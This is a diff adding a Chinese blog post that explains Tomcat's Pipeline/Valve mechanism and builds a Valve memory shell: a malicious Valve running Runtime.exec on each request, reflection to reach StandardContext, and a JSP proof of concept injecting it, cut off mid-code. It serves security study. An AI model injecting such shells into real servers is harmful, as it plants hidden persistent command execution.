@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Valve内存马 前置基础 **tomcat的内部结构**  tomcat由Connector和Container两部分组成  Connector主要负责对外的网络交互，当收到网络请求时，它将请求包包装为Request，再将Request交给Container进行处理，最终返回给请求方 tomcat中的Container有四种，分别为engine,host,context,wrapper，实现类分">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Valve内存马">
+<meta property="og:url" content="http://curlysean.github.io/2025/03/22/Valve%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="肖恩的博客">
+<meta property="og:description" content="Valve内存马 前置基础 **tomcat的内部结构**  tomcat由Connector和Container两部分组成  Connector主要负责对外的网络交互，当收到网络请求时，它将请求包包装为Request，再将Request交给Container进行处理，最终返回给请求方 tomcat中的Container有四种，分别为engine,host,context,wrapper，实现类分">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740104568341-18b63c8e-c408-4868-af93-667315e0ac45.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740105276158-12302953-9846-4902-a423-43a661667630.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740106822054-092bf012-6bd5-4a30-a828-b209ef97b143.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740108765334-e82c69bb-b0be-466e-8eb7-a2f1fc84acae.png">
+<meta property="article:published_time" content="2025-03-22T08:03:32.392Z">
+<meta property="article:modified_time" content="2025-03-22T08:05:37.038Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="memShell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740104568341-18b63c8e-c408-4868-af93-667315e0ac45.png">
+
+
+<link rel="canonical" href="http://curlysean.github.io/2025/03/22/Valve%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/03/22/Valve%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2025/03/22/Valve内存马/","title":"Valve内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Valve内存马 | 肖恩的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">肖恩的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JBOpy"><span class="nav-number">1.</span> <span class="nav-text">Valve内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pNWVG"><span class="nav-number">1.1.</span> <span class="nav-text">前置基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#THsul"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xVQoi"><span class="nav-number">1.2.1.</span> <span class="nav-text">Valve何处加载</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FeMug"><span class="nav-number">1.3.</span> <span class="nav-text">实现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#gm19w"><span class="nav-number">1.3.1.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#i4VKS"><span class="nav-number">1.3.2.</span> <span class="nav-text">Valve内存马实现</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/22/Valve%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Valve内存马 | 肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Valve内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-03-22 16:03:32 / 修改时间：16:05:37" itemprop="dateCreated datePublished" datetime="2025-03-22T16:03:32+08:00">2025-03-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="JBOpy">Valve内存马</h1>
+<h2 id="pNWVG">前置基础</h2>
+**tomcat的内部结构**
+
+<p><font style="color:rgb(80, 80, 92);">tomcat由Connector和Container两部分组成</font></p>
+<ul>
+<li><font style="color:rgb(80, 80, 92);">Connector主要负责对外的网络交互，当收到网络请求时，它将请求包包装为Request，再将Request交给Container进行处理，最终返回给请求方</font></li>
+<li><font style="color:rgb(80, 80, 92);">tomcat中的Container有四种，分别为</font><font style="color:rgb(77, 77, 77);">engine,host,context,wrapper，实现类分别是StandardEngine,StandardHost,StandardContext,StandardWrapper，四个容器间是包含关系</font></li>
+</ul>
+<p>我觉得下面这幅图很好的展示了tomcat的结构<img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740104568341-18b63c8e-c408-4868-af93-667315e0ac45.png"></p>
+<p><font style="color:rgb(80, 80, 92);">我们要学习 Valve 型内存马，就必须要先了解一下 Valve 是什么</font></p>
+<blockquote>
+<p><font style="color:rgb(80, 80, 92);">在了解 Valve 之前，我们先来简单了解一下 Tomcat 中的</font><strong>管道机制</strong><font style="color:rgb(80, 80, 92);">。</font></p>
+<p><font style="color:rgb(80, 80, 92);">我们知道，当 Tomcat 接收到客户端请求时，首先会使用</font><font style="color:rgb(80, 80, 92);"> </font><code>Connector</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">进行解析，然后发送到</font><font style="color:rgb(80, 80, 92);"> </font><code>Container</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到 Servlet 进行处理的呢？这里涉及到的机制就是 Tomcat 管道机制。</font></p>
+<p><font style="color:rgb(80, 80, 92);">管道机制主要涉及到两个名词，Pipeline（管道）和 Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。</font></p>
+<p><font style="color:rgb(80, 80, 92);">因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。个人理解就是管道与阀门的这种模式，我们可以通过调整阀门，来实现不同的业务。</font></p>
+</blockquote>
+<p><font style="color:rgb(80, 80, 92);">在Catalina中，有着四种Container，每个容器都有自己的Pipeline（管道）组件，每个Pipeline组件至少会存在一个Valve（阀门），这个Valve我们称之为BaseValve（基础阀）</font></p>
+<p><strong><font style="color:rgb(80, 80, 92);">Pipeline 提供了 </font></strong><code>**addValve**</code><strong><font style="color:rgb(80, 80, 92);"> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行</font></strong></p>
+<p><font style="color:rgb(80, 80, 92);">当Connector将Request交给Container处理后，Container第一层就是Engine容器，但在tomcat中Engine容器不会直接调用它下一层Host容器去处理相关请求，而是通过Pipeline组件去处理，</font><font style="color:rgb(77, 77, 77);">跟pipeline相关的还有个也是容器内部的组件，叫做valve组件</font></p>
+<p><font style="color:rgb(80, 80, 92);">下面是 Pipeline 发挥功能的原理图</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740105276158-12302953-9846-4902-a423-43a661667630.png"></p>
+<h2 id="THsul">分析</h2>
+这里我们先实现一个基础的Valve
+
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">catalina</span>.<span class="property">connector</span>.<span class="property">Request</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">catalina</span>.<span class="property">connector</span>.<span class="property">Response</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">catalina</span>.<span class="property">valves</span>.<span class="property">ValveBase</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">ValveTest</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ValveBase</span> &#123;</span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">invoke</span>(<span class="title class_">Request</span> request, <span class="title class_">Response</span> response) throws <span class="title class_">IOException</span>, <span class="title class_">ServletException</span> &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;Valve 被成功调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现好Valve后，我们需要通过<code>addValve</code>方法，将Valve添加进Pipeline中，我们只要将Valve添加进去，就能实现内存马的注入</p>
+<p>看一眼<code>Pipeline</code>的接口，存在<code>addValve</code>方法，我们可以通过这个方法把Valve添加进去</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package org.<span class="property">apache</span>.<span class="property">catalina</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Set</span>;</span><br><span class="line"></span><br><span class="line">public interface <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">Valve</span> <span class="title function_">getBasic</span>();</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">setBasic</span>(<span class="title class_">Valve</span> valve);</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">addValve</span>(<span class="title class_">Valve</span> valve);</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">Valve</span>[] <span class="title function_">getValves</span>();</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">removeValve</span>(<span class="title class_">Valve</span> valve);</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">Valve</span> <span class="title function_">getFirst</span>();</span><br><span class="line"></span><br><span class="line">    public boolean <span class="title function_">isAsyncSupported</span>();</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span>(<span class="title class_">Set</span>&lt;<span class="title class_">String</span>&gt; result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>找到Pipeline接口的实现类<code>StandardPipeline</code>，<font style="color:rgb(80, 80, 92);">，但是我们是无法直接获取到 </font><code>StandardPipeline</code><font style="color:rgb(80, 80, 92);"> 的，所以这里去找一找 </font><code>StandardContext</code><font style="color:rgb(80, 80, 92);"> 有没有获取到 </font><code>StandardPipeline</code><font style="color:rgb(80, 80, 92);"> 的手段</font></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740106822054-092bf012-6bd5-4a30-a828-b209ef97b143.png"></p>
+<p>在<code>StandardContext</code>中，找到了一个<code>getPipeline</code>方法，跟进查看，会返回当前的<code>Pipeline</code></p>
+<p><font style="color:rgb(80, 80, 92);">可以看一下注解，这里写着 return 一个 Pipeline 类型的类，它是用来管理 Valves 的</font></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected final <span class="title class_">Pipeline</span> pipeline = <span class="keyword">new</span> <span class="title class_">StandardPipeline</span>(<span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Return the Pipeline object that manages the Valves associated with this Container</span></span><br><span class="line">@<span class="title class_">Override</span></span><br><span class="line">    public <span class="title class_">Pipeline</span> <span class="title function_">getPipeline</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">pipeline</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以证明这一点</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">StandardContext</span>.<span class="title function_">getPipeline</span>() = <span class="title class_">StandardPipeline</span>; <span class="comment">// 二者等价</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="xVQoi">Valve何处加载</h3>
+<font style="color:rgb(80, 80, 92);">有个问题：我们的 Valve 是应该放到 Filter，Listener，还是 Servlet 里面？</font>
+
+<p>应该是在Servlet中被加载的，因为在Servlet内存马的<code>HTTP11Processor</code><font style="color:rgb(80, 80, 92);"> 的加载 HTTP 请求当中，是出现了 Pipeline 的 basic 的</font></p>
+<p>所以我们通过 Servlet 来加载。</p>
+<h2 id="FeMug">实现</h2>
+<h3 id="gm19w">思路分析</h3>
+现在的思路就已经很明确了
+
+<ol>
+<li>编写恶意Valve</li>
+<li>反射获取<code>StandardContext</code></li>
+<li>调用<code>getPieline（）</code>方法获取<code>StandardPipeline</code></li>
+<li>通过<code>addValve</code>方法将恶意Valve添加入<code>StandardPipeline</code></li>
+</ol>
+<h3 id="i4VKS">Valve内存马实现</h3>
+我们先编写一个恶意的Valve内存马
+
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">  public <span class="keyword">class</span> <span class="title class_">shellValve</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ValveBase</span> &#123;</span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">  public <span class="keyword">void</span> <span class="title function_">invoke</span>(<span class="title class_">Request</span> request, <span class="title class_">Response</span> response) throws <span class="title class_">IOException</span>, <span class="title class_">ServletException</span> &#123;</span><br><span class="line">    <span class="title class_">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>后续和前几个内存马一样，通过反射来获取<code>StandardContext</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
+
+<p>这里从别的师傅那里看到的，更简单方法的获取<code>StandardContext</code>，两个都是可以的</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 更简单的方法 获取StandardContext  </span></span><br><span class="line"> <span class="title class_">Field</span> reqF = request.<span class="title function_">getClass</span>().<span class="title function_">getDeclaredField</span>(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line"> reqF.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);  </span><br><span class="line"> <span class="title class_">Request</span> req = (<span class="title class_">Request</span>) reqF.<span class="title function_">get</span>(request);  </span><br><span class="line"> <span class="title class_">StandardContext</span> standardContext = (<span class="title class_">StandardContext</span>) req.<span class="title function_">getContext</span>();  </span><br></pre></td></tr></table></figure>
+
+<p>最后实现内存马的注入</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  standardContext.<span class="title function_">getPipeline</span>().<span class="title function_">addValve</span>(<span class="keyword">new</span> <span class="title function_">shellValve</span>());</span><br><span class="line">  out.<span class="title function_">println</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终poc如下</strong></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;&lt;%--</span><br><span class="line">  <span class="title class_">Created</span> by <span class="title class_">IntelliJ</span> <span class="variable constant_">IDEA</span>.</span><br><span class="line">  <span class="title class_">User</span>: <span class="title class_">Andu1</span>n</span><br><span class="line">  <span class="title class_">Date</span>: <span class="number">2025</span>/<span class="number">2</span>/<span class="number">21</span></span><br><span class="line">  <span class="title class_">Time</span>: <span class="number">11</span>:<span class="number">15</span></span><br><span class="line">  <span class="title class_">To</span> change <span class="variable language_">this</span> template use <span class="title class_">File</span> | <span class="title class_">Settings</span> | <span class="title class_">File</span> <span class="title class_">Templates</span>.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%</span></span><br><span class="line"><span class="language-xml">  ServletContext servletContext = request.getSession().getServletContext();</span></span><br><span class="line"><span class="language-xml">  Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="language-xml">  appctx.setAccessible(true);</span></span><br><span class="line"><span class="language-xml">  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="language-xml">  stdctx.setAccessible(true);</span></span><br><span class="line"><span class="language-xml">  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&lt;%!</span></span><br><span class="line"><span class="language-xml">  public class shellValve extends ValveBase &#123;</span></span><br><span class="line"><span class="language-xml">    @Override</span></span><br><span class="line"><span class="language-xml">    public void invoke(Request request, Response response) throws IOException, ServletException &#123;</span></span><br><span class="line"><span class="language-xml">      Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">  &#125;</span></span><br><span class="line"><span 